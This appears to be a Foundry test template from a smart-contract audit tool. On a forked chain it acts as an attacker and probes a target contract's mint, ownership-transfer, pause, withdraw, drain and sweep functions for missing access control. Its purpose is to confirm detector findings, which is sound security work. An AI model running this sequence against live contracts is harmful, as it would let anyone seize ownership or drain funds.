// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unprotected privileged function
/// @notice Detector: unprotected-admin. A privileged function (mint, set
///         owner, pause, ...) has no access check, so ANY caller can use
///         it. Tries mint / setOwner / pause in turn; each attempt must
///         change observable state to count as proof.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: narrow to the target's real
///      privileged function if known.

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _readOwner() internal view returns (bool found, address owner_) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));
        return (false, address(0));
    }

    function _staticUint(address t, bytes memory data) internal view returns (uint256 v) {
        (bool ok, bytes memory ret) = t.staticcall(data);
        if (ok && ret.length >= 32) v = abi.decode(ret, (uint256));
    }

    function _staticAddr(address t, bytes memory data) internal view returns (address v) {
        (bool ok, bytes memory ret) = t.staticcall(data);
        if (ok && ret.length >= 32) v = abi.decode(ret, (address));
    }

    function _staticBool(address t, bytes memory data) internal view returns (bool v) {
        (bool ok, bytes memory ret) = t.staticcall(data);
        if (ok && ret.length >= 32) v = abi.decode(ret, (bool));
    }

    /// @dev Fingerprint of every observable a privileged action of this class
    ///      could move: the attacker's token balance, the owner slot, the pause
    ///      flag, and raw slot 0. A call that changes NONE of these proves
    ///      nothing even when it returns successfully.
    function _observe(address attacker) internal view returns (uint256) {
        return uint256(
            keccak256(
                abi.encode(
                    _staticUint(target, abi.encodeWithSignature("balanceOf(address)", attacker)),
                    _staticAddr(target, abi.encodeWithSignature("owner()")),
                    _staticBool(target, abi.encodeWithSignature("paused()")),
                    attacker.balance,
                    target.balance,
                    vm.load(target, bytes32(0))
                )
            )
        );
    }

    /// Try each plausible entry point and accept the first that changes the
    /// OBSERVABLE -- never the first that returns. A no-op or already-guarded
    /// function returns successfully and changes nothing, so judging by the call
    /// result reports "not reproduced" for a vulnerability that exists under
    /// another name.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && _observe(attacker) != before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(
            attacker,
            before,
            "mint(address,uint256)",
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1000 ether)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "setOwner(address)", abi.encodeWithSignature("setOwner(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "transferOwnership(address)",
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "pause()", abi.encodeWithSignature("pause()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "unpause()", abi.encodeWithSignature("unpause()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "withdraw()", abi.encodeWithSignature("withdraw()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "withdrawAll()", abi.encodeWithSignature("withdrawAll()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "drain()", abi.encodeWithSignature("drain()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "sweep(address)", abi.encodeWithSignature("sweep(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 before = _observe(attackerEOA);
        string memory used = _tryEntry(attackerEOA, before);
        console.log("entry point that changed state:", used);

        uint256 afterState = _observe(attackerEOA);
        uint256 delta = afterState != before ? 1 : 0;
        (bool found, address owner_) = _readOwner();
        if (found) console.log("owner after attempts:", owner_);
        assertGt(
            delta,
            0,
            "no privileged action changed observable state. Tried mint(address,uint256), setOwner(address), transferOwnership(address), pause(), unpause(), withdraw(), withdrawAll(), drain(), sweep(address). This does NOT establish safety: the privileged function may be guarded by an owner check, named differently, take other arguments, or be reachable only by the owner."
        );
    }
}
